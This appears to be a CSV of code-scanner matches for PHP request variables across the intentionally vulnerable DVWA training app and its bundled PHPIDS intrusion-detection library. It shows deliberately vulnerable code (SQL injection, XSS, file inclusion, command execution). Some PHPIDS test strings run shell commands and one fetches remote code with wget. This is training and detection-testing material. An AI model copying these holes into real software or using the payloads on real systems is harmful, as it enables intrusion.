"file_type","file","line_number","match","name","snippet","group"
"php","./vulnerabilities/csrf/source/medium.php","3","$_GET","$_GET","1-<?php2-			3:	if (isset($_GET['Change'])) {4-	5-		// Checks the http referer header6-		if ( eregi ( ""127.0.0.1"", $_SERVER['HTTP_REFERER'] ) ){7-	8-			// Turn requests into variables9:			$pass_new = $_GET['password_new'];10:			$pass_conf = $_GET['password_conf'];11-12-			if ($pass_new == $pass_conf){13-				$pass_new = mysql_real_escape_string($pass_new);","form_data"
"php","./vulnerabilities/csrf/source/low.php","3","$_GET","$_GET","1-<?php2-				3:	if (isset($_GET['Change'])) {4-	5-		// Turn requests into variables6:		$pass_new = $_GET['password_new'];7:		$pass_conf = $_GET['password_conf'];8-9-10-		if (($pass_new == $pass_conf)){","form_data"
"php","./vulnerabilities/csrf/source/high.php","3","$_GET","$_GET","1-<?php2-			3:	if (isset($_GET['Change'])) {4-	5-		// Turn requests into variables6:		$pass_curr = $_GET['password_current'];7:		$pass_new = $_GET['password_new'];8:		$pass_conf = $_GET['password_conf'];9-10-		// Sanitise current password input11-		$pass_curr = stripslashes( $pass_curr );","form_data"
"php","./vulnerabilities/view_source_all.php","10","$_GET","$_GET","7-$page = dvwaPageNewGrab();8-$page[ 'title' ] .= $page[ 'title_separator' ].'Source';9-10:$id = $_GET[ 'id' ];11-12-$lowsrc = @file_get_contents(""./{$id}/source/low.php"");13-$lowsrc = str_replace( array( '$html .=' ), array( 'echo' ), $lowsrc);","form_data"
"php","./vulnerabilities/brute/source/medium.php","3","$_GET","$_GET","1-<?php2-3:if( isset( $_GET[ 'Login' ] ) ) {4-5-	// Sanitise username input6:	$user = $_GET[ 'username' ];7-	$user = mysql_real_escape_string( $user );8-9-	// Sanitise password input10:	$pass = $_GET[ 'password' ];11-	$pass = mysql_real_escape_string( $pass );12-	$pass = md5( $pass );13-","form_data"
"php","./vulnerabilities/brute/source/low.php","3","$_GET","$_GET","1-<?php2-3:if( isset( $_GET['Login'] ) ) {4-5:	$user = $_GET['username'];6-	7:	$pass = $_GET['password'];8-	$pass = md5($pass);9-10-	$qry = ""SELECT * FROM `users` WHERE user='$user' AND password='$pass';"";","form_data"
"php","./vulnerabilities/brute/source/high.php","3","$_GET","$_GET","1-<?php2-3:if( isset( $_GET[ 'Login' ] ) ) {4-5-	// Sanitise username input6:	$user = $_GET[ 'username' ];7-	$user = stripslashes( $user );8-	$user = mysql_real_escape_string( $user );9-10-	// Sanitise password input11:	$pass = $_GET[ 'password' ];12-	$pass = stripslashes( $pass );13-	$pass = mysql_real_escape_string( $pass );14-	$pass = md5( $pass );","form_data"
"php","./vulnerabilities/view_help.php","11","$_GET","$_GET","8-$page = dvwaPageNewGrab();9-$page[ 'title' ] .= $page[ 'title_separator' ].'Help';10-11:$id = $_GET[ 'id' ];12:$security = $_GET[ 'security' ];13-14-$help = file_get_contents( DVWA_WEB_PAGE_TO_ROOT.""vulnerabilities/{$id}/help/help.php"" );15-","form_data"
"php","./vulnerabilities/xss_r/source/medium.php","3","$_GET","$_GET","1-<?php2-3:if(!array_key_exists (""name"", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){4-5- $isempty = true;6-7-} else {8-9- $html .= '<pre>';10: $html .= 'Hello ' . str_replace('<script>', '', $_GET['name']);11- $html .= '</pre>'; 12-13-}","form_data"
"php","./vulnerabilities/xss_r/source/low.php","3","$_GET","$_GET","1-<?php2-3:if(!array_key_exists (""name"", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){4-5- $isempty = true;6-7-} else {8-		9- $html .= '<pre>';10: $html .= 'Hello ' . $_GET['name'];11- $html .= '</pre>';12-	13-}","form_data"
"php","./vulnerabilities/xss_r/source/high.php","3","$_GET","$_GET","1-<?php2-	3:if(!array_key_exists (""name"", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){4-	5- $isempty = true;6-		7-} else {8-	9- $html .= '<pre>';10: $html .= 'Hello ' . htmlspecialchars($_GET['name']);11- $html .= '</pre>';12-		13-}","form_data"
"php","./vulnerabilities/view_source.php","11","$_GET","$_GET","8-$page = dvwaPageNewGrab();9-$page[ 'title' ] .= $page[ 'title_separator' ].'Source';10-11:$id = $_GET[ 'id' ];12:$security = $_GET[ 'security' ];13-14-15-if ($id == 'fi'){","form_data"
"php","./vulnerabilities/sqli_blind/source/medium.php","3","$_GET","$_GET","1-<?php2-3:if (isset($_GET['Submit'])) {4-5-	// Retrieve data6-7:	$id = $_GET['id'];8-	$id = mysql_real_escape_string($id);9-10-	$getid = ""SELECT first_name, last_name FROM users WHERE user_id = $id"";","form_data"
"php","./vulnerabilities/sqli_blind/source/low.php","3","$_GET","$_GET","1-<?php	2-3:if (isset($_GET['Submit'])) {4-	5-	// Retrieve data6-	7:	$id = $_GET['id'];8-9-	$getid = ""SELECT first_name, last_name FROM users WHERE user_id = '$id'"";10-	$result = mysql_query($getid); // Removed 'or die' to suppres mysql errors","form_data"
"php","./vulnerabilities/sqli_blind/source/high.php","3","$_GET","$_GET","1-<?php	2-3:if(isset($_GET['Submit'])){4-5-	// Retrieve data6-7:	$id = $_GET['id'];8-	$id = stripslashes($id);9-	$id = mysql_real_escape_string($id);10-","form_data"
"php","./vulnerabilities/fi/source/medium.php","3","$_GET","$_GET","1-<?php2-3:	$file = $_GET['page']; // The page we wish to display 4-5-	// Bad input validation6-	$file = str_replace(""http://"", """", $file);","form_data"
"php","./vulnerabilities/fi/source/low.php","3","$_GET","$_GET","1-<?php2-3:	$file = $_GET['page']; //The page we wish to display 4-5-?>","form_data"
"php","./vulnerabilities/fi/source/high.php","3","$_GET","$_GET","1-<?php2-		3:	$file = $_GET['page']; //The page we wish to display 4-5-	// Only allow include.php6-	if ( $file != ""include.php"" ) {","form_data"
"php","./external/phpids/0.6/docs/examples/example.php","43","$_GET","$_GET","40-    */41-    $request = array(42-        'REQUEST' => $_REQUEST,43:        'GET' => $_GET,44-        'POST' => $_POST,45-        'COOKIE' => $_COOKIE46-    );","form_data"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1056","$_GET","$_GET","1053-        $exploits[] = '"";; //1054-                        if (!($_b[]  %1)) $_a[0]  = system;1055-                        $_a[0](!a. ""ls"");  //';1056:        $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';1057-        $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';1058-1059-        $this->_testForPlainEvent($exploits);","form_data"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php","406","$_GET","$_GET","403-    }404-    405-    /**406:     * Loads configuration values from $_GET/$_POST that were posted407-     * via ConfigForm408:     * @param $array $_GET or $_POST array to import409-     * @param $index Index/name that the config variables are in410-     * @param $allowed List of allowed namespaces/directives 411-     * @param $mq_fix Boolean whether or not to enable magic quotes fix","form_data"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php","421","$_GET","$_GET","418-    }419-    420-    /**421:     * Merges in configuration values from $_GET/$_POST to object. NOT STATIC.422-     * @note Same parameters as loadArrayFromForm423-     */424-    public function mergeArrayFromForm($array, $index = false, $allowed = true, $mq_fix = true) {","form_data"
"php","./dvwa/includes/dvwaPhpIds.inc.php","45","$_GET","$_GET","42-43-// Clear PHPIDS log44-function dvwaClearIdsLog()	{45:	if (isset($_GET['clear_log'])) { 46-		$fp = fopen(DVWA_WEB_PAGE_TO_PHPIDS_LOG, w);47-		fclose($fp);48-		dvwaMessagePush( ""PHPIDS log cleared"" );","form_data"
"php","./dvwa/includes/dvwaPhpIds.inc.php","58","$_GET","$_GET","55-	try {56-		$request = array(57-			'REQUEST' => $_REQUEST,58:			'GET' => $_GET,59-			'POST' => $_POST,60-			'COOKIE' => $_COOKIE61-		);","form_data"
"php","./instructions.php","19","$_GET","$_GET","16-	'PHPIDS-license' => array( 'legend' => 'PHPIDS License', 'file' => DVWA_WEB_PAGE_TO_PHPIDS.'LICENSE' ),17-);18-19:$selectedDocId = isset( $_GET[ 'doc' ] ) ? $_GET[ 'doc' ] : '';20-if( !array_key_exists( $selectedDocId, $docs ) ) {21-	$selectedDocId = 'readme';22-}","form_data"
"php","./security.php","31","$_GET","$_GET","28-}29-30-31:if( isset( $_GET['phpids'] ) ) {32:	switch( $_GET[ 'phpids' ] ) {33-		case 'on':34-			dvwaPhpIdsEnabledSet( true );35-			dvwaMessagePush( ""PHPIDS is now enabled"" );","form_data"
"php","./vulnerabilities/upload/source/medium.php","2","$_POST","$_POST","2:	if (isset($_POST['Upload'])) {3-4-			$target_path = DVWA_WEB_PAGE_TO_ROOT.""hackable/uploads/"";5-			$target_path = $target_path . basename($_FILES['uploaded']['name']);","form_data"
"php","./vulnerabilities/upload/source/low.php","2","$_POST","$_POST","1-<?php2:	if (isset($_POST['Upload'])) {3-4-			$target_path = DVWA_WEB_PAGE_TO_ROOT.""hackable/uploads/"";5-			$target_path = $target_path . basename( $_FILES['uploaded']['name']);","form_data"
"php","./vulnerabilities/upload/source/high.php","2","$_POST","$_POST","1-<?php2:if (isset($_POST['Upload'])) {3-4-			$target_path = DVWA_WEB_PAGE_TO_ROOT.""hackable/uploads/"";5-			$target_path = $target_path . basename($_FILES['uploaded']['name']);","form_data"
"php","./vulnerabilities/exec/source/medium.php","3","$_POST","$_POST","1-<?php2-3:if( isset( $_POST[ 'submit'] ) ) {4-5-	$target = $_REQUEST[ 'ip' ];6-","form_data"
"php","./vulnerabilities/exec/source/low.php","3","$_POST","$_POST","1-<?php2-3:if( isset( $_POST[ 'submit' ] ) ) {4-5-	$target = $_REQUEST[ 'ip' ];6-","form_data"
"php","./vulnerabilities/exec/source/high.php","3","$_POST","$_POST","1-<?php2-3:if( isset( $_POST[ 'submit' ] ) ) {4-5-	$target = $_REQUEST[""ip""];6-","form_data"
"php","./vulnerabilities/xss_s/source/medium.php","3","$_POST","$_POST","1-<?php2-3:if(isset($_POST['btnSign']))4-{5-6:   $message = trim($_POST['mtxMessage']);7:   $name    = trim($_POST['txtName']);8-   9-   // Sanitize message input10-   $message = trim(strip_tags(addslashes($message)));","form_data"
"php","./vulnerabilities/xss_s/source/low.php","3","$_POST","$_POST","1-<?php2-3:if(isset($_POST['btnSign']))4-{5-6:   $message = trim($_POST['mtxMessage']);7:   $name    = trim($_POST['txtName']);8-   9-   // Sanitize message input10-   $message = stripslashes($message);","form_data"
"php","./vulnerabilities/xss_s/source/high.php","3","$_POST","$_POST","1-<?php2-3:if(isset($_POST['btnSign']))4-{5-6:   $message = trim($_POST['mtxMessage']);7:   $name    = trim($_POST['txtName']);8-   9-   // Sanitize message input10-   $message = stripslashes($message);","form_data"
"php","./external/phpids/0.6/docs/examples/example.php","44","$_POST","$_POST","41-    $request = array(42-        'REQUEST' => $_REQUEST,43-        'GET' => $_GET,44:        'POST' => $_POST,45-        'COOKIE' => $_COOKIE46-    );47-","form_data"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php","406","$_POST","$_POST","403-    }404-    405-    /**406:     * Loads configuration values from $_GET/$_POST that were posted407-     * via ConfigForm408:     * @param $array $_GET or $_POST array to import409-     * @param $index Index/name that the config variables are in410-     * @param $allowed List of allowed namespaces/directives 411-     * @param $mq_fix Boolean whether or not to enable magic quotes fix","form_data"
"php","./external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/Config.php","421","$_POST","$_POST","418-    }419-    420-    /**421:     * Merges in configuration values from $_GET/$_POST to object. NOT STATIC.422-     * @note Same parameters as loadArrayFromForm423-     */424-    public function mergeArrayFromForm($array, $index = false, $allowed = true, $mq_fix = true) {","form_data"
"php","./dvwa/includes/dvwaPhpIds.inc.php","59","$_POST","$_POST","56-		$request = array(57-			'REQUEST' => $_REQUEST,58-			'GET' => $_GET,59:			'POST' => $_POST,60-			'COOKIE' => $_COOKIE61-		);62-","form_data"
"php","./login.php","11","$_POST","$_POST","8-9-dvwaDatabaseConnect();10-11:if( isset( $_POST[ 'Login' ] ) ) {12-13-14:	$user = $_POST[ 'username' ];15-	$user = stripslashes( $user );16-	$user = mysql_real_escape_string( $user );17-18:	$pass = $_POST[ 'password' ];19-	$pass = stripslashes( $pass );20-	$pass = mysql_real_escape_string( $pass );21-	$pass = md5( $pass );","form_data"
"php","./setup.php","12","$_POST","$_POST","9-$page[ 'title' ] .= $page[ 'title_separator' ].'Setup';10-$page[ 'page_id' ] = 'setup';11-12:if( isset( $_POST[ 'create_db' ] ) ) {13-14-	if ($DBMS == 'MySQL') {15-		include_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/DBMS/MySQL.php';","form_data"
"php","./security.php","13","$_POST","$_POST","10-$page[ 'page_id' ] = 'security';11-12-$securityHtml = '';13:if( isset( $_POST['seclev_submit'] ) ) {14-	$securityLevel = 'high';15-16:	switch( $_POST[ 'security' ] ) {17-		case 'low':18-			$securityLevel = 'low';19-			break;","form_data"
"php","./vulnerabilities/exec/source/medium.php","5","$_REQUEST","$_REQUEST","3-if( isset( $_POST[ 'submit'] ) ) {4-5:	$target = $_REQUEST[ 'ip' ];6-7-	// Remove any of the charactars in the array (blacklist).8-	$substitutions = array(","form_data"
"php","./vulnerabilities/exec/source/low.php","5","$_REQUEST","$_REQUEST","2-3-if( isset( $_POST[ 'submit' ] ) ) {4-5:	$target = $_REQUEST[ 'ip' ];6-7-	// Determine OS and execute the ping command.8-	if (stristr(php_uname('s'), 'Windows NT')) {","form_data"
"php","./vulnerabilities/exec/source/high.php","5","$_REQUEST","$_REQUEST","2-3-if( isset( $_POST[ 'submit' ] ) ) {4-5:	$target = $_REQUEST[""ip""];6-	7-	$target = stripslashes( $target );8-","form_data"
"php","./external/phpids/0.6/docs/examples/example.php","42","$_REQUEST","$_REQUEST","39-    * with your variables_order settings40-    */41-    $request = array(42:        'REQUEST' => $_REQUEST,43-        'GET' => $_GET,44-        'POST' => $_POST,45-        'COOKIE' => $_COOKIE","form_data"
"php","./external/phpids/0.6/docs/examples/cakephp/ids.php","118","$_REQUEST","$_REQUEST","115-        vendor('phpids/IDS/Init');116-117-        #add request url and user agent118:        $_REQUEST['IDS_request_uri'] = $_SERVER['REQUEST_URI'];119-        if (isset($_SERVER['HTTP_USER_AGENT'])) {120:            $_REQUEST['IDS_user_agent'] = $_SERVER['HTTP_USER_AGENT'];121-        }122-123-        #init the PHPIDS and pass the REQUEST array124-        $this->init = IDS_Init::init();125:        $ids        = new IDS_Monitor($this->init, $_REQUEST);126-        $result     = $ids->run();127-128-        // Re-set include path","form_data"
"php","./dvwa/includes/dvwaPhpIds.inc.php","57","$_REQUEST","$_REQUEST","54-function dvwaPhpIdsTrap() {55-	try {56-		$request = array(57:			'REQUEST' => $_REQUEST,58-			'GET' => $_GET,59-			'POST' => $_POST,60-			'COOKIE' => $_COOKIE","form_data"
"php","./external/phpids/0.6/tests/IDS/CachingTest.php","88","$_SESSION","$_SESSION","86-        $cache = IDS_Caching::factory($this->init, 'storage');87-        $cache = $cache->setCache(array(1,2,3,4));88:        $_SESSION['PHPIDS']['storage'] = null;89-        $this->assertFalse($cache->getCache());90-    }91-","globals"
"php","./external/phpids/0.6/lib/IDS/Caching/Session.php","118","$_SESSION","$_SESSION","115-    public function setCache(array $data) 116-    {117-118:        $_SESSION['PHPIDS'][$this->type] = $data;119-        return $this;120-    }121-","globals"
"php","./external/phpids/0.6/lib/IDS/Caching/Session.php","132","$_SESSION","$_SESSION","129-    public function getCache() 130-    {131-132:        if ($this->type && $_SESSION['PHPIDS'][$this->type]) {133:            return $_SESSION['PHPIDS'][$this->type];134-        }135-136-        return false;","globals"
"php","./dvwa/includes/dvwaPage.inc.php","53","$_SESSION","$_SESSION","50-51-function &dvwaSessionGrab() {52-53:	if( !isset( $_SESSION[ 'dvwa' ] ) ) {54-55:		$_SESSION[ 'dvwa' ] = array();56-57-	}58-59:	return $_SESSION[ 'dvwa' ];60-}61-62-","globals"
"php","./vulnerabilities/csrf/source/medium.php","6","$_SERVER","$_SERVER","4-	5-		// Checks the http referer header6:		if ( eregi ( ""127.0.0.1"", $_SERVER['HTTP_REFERER'] ) ){7-	8-			// Turn requests into variables9-			$pass_new = $_GET['password_new'];","globals"
"php","./external/phpids/0.6/docs/examples/cakephp/ids.php","118","$_SERVER","$_SERVER","115-        vendor('phpids/IDS/Init');116-117-        #add request url and user agent118:        $_REQUEST['IDS_request_uri'] = $_SERVER['REQUEST_URI'];119:        if (isset($_SERVER['HTTP_USER_AGENT'])) {120:            $_REQUEST['IDS_user_agent'] = $_SERVER['HTTP_USER_AGENT'];121-        }122-123-        #init the PHPIDS and pass the REQUEST array","globals"
"php","./external/phpids/0.6/docs/examples/cakephp/ids.php","194","$_SERVER","$_SERVER","191-                $this->controller->Session->read('User.id') :192-                0;193-194:        $ip = ($_SERVER['SERVER_ADDR'] != '127.0.0.1') ?195:                    $_SERVER['SERVER_ADDR'] :196:                        (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ?197:                            $_SERVER['HTTP_X_FORWARDED_FOR'] :198-                                 '127.0.0.1');199-200-        foreach ($result as $event) {","globals"
"php","./external/phpids/0.6/docs/examples/cakephp/ids.php","205","$_SERVER","$_SERVER","202-                'Intrusion' => array(203-                    'name'      => $event->getName(),204-                    'value'     => stripslashes($event->getValue()),205:                    'page'      => $_SERVER['REQUEST_URI'],206-                    'userid'    => $user,207-                    'session'   => session_id() ? session_id() : '0',208-                    'ip'        => $ip,","globals"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1025","$_SERVER","$_SERVER","1022-        $exploits[] = '"" ; //1023-                        if (!0) $_a ="""". str_rot13(\'cevags\'); //1024-                        $_b = HTTP_USER_AGENT; //1025:                        $_c="""". $_SERVER[$_b]; //1026-                        $_a( `$_c` );//';1027-        $exploits[] = '""; //1028-                        $_c = """" . $_a($b);","globals"
"php","./external/phpids/0.6/tests/IDS/MonitorTest.php","1035","$_SERVER","$_SERVER","1032-                        if  (!0) $_b = parse_str ; //1033-                        $_c = """" . strrev(""ftnirp"");1034-                        if  (!0)  $_d = QUERY_STRING; //1035:                        $_e= """" . $_SERVER[$_d];1036-                        $_b($_e); //1037-                        $_f = """" . $_a($b);1038-                        $_c(`$_f`);//';","globals"
"php","./external/phpids/0.6/lib/IDS/Log/File.php","90","$_SERVER","$_SERVER","87-    {88-89-        // determine correct IP address90:        if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1') {91:            $this->ip = $_SERVER['REMOTE_ADDR'];92:        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {93:            $this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];94-        }95-96-        $this->logfile = $logfile;","globals"
"php","./external/phpids/0.6/lib/IDS/Log/File.php","163","$_SERVER","$_SERVER","160-                              $data->getImpact(),161-                              join(' ', $data->getTags()),162-                              trim($attackedParameters),163:                              urlencode($_SERVER['REQUEST_URI']),164:                              $_SERVER['SERVER_ADDR']);165-166-        return $dataString;167-    }","globals"
"php","./external/phpids/0.6/lib/IDS/Log/Database.php","163","$_SERVER","$_SERVER","160-        }161-162-        // determine correct IP address163:        if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1') {164:            $this->ip = $_SERVER['REMOTE_ADDR'];165:        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {166:            $this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];167-        }168-169-        try {","globals"
"php","./external/phpids/0.6/lib/IDS/Log/Database.php","248","$_SERVER","$_SERVER","245-     */246-    public function execute(IDS_Report $data) 247-    {248:        if (!isset($_SERVER['REQUEST_URI'])) {249:            $_SERVER['REQUEST_URI'] = substr($_SERVER['PHP_SELF'], 1);250:            if (isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING']) { 251:                $_SERVER['REQUEST_URI'] .= '?' . $_SERVER['QUERY_STRING']; 252-            } 253-        }     	254-255-        foreach ($data as $event) {256:            $page = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';257-            $ip   = $this->ip;258-259-            $this->statement->bindParam('name', $event->getName());","globals"
"php","./external/phpids/0.6/lib/IDS/Log/Database.php","264","$_SERVER","$_SERVER","261-            $this->statement->bindParam('page', $page);262-            $this->statement->bindParam('ip', $ip);263-            $this->statement->bindParam('impact', $data->getImpact());264:            $this->statement->bindParam('origin', $_SERVER['SERVER_ADDR']);265-266-            if (!$this->statement->execute()) {267-","globals"
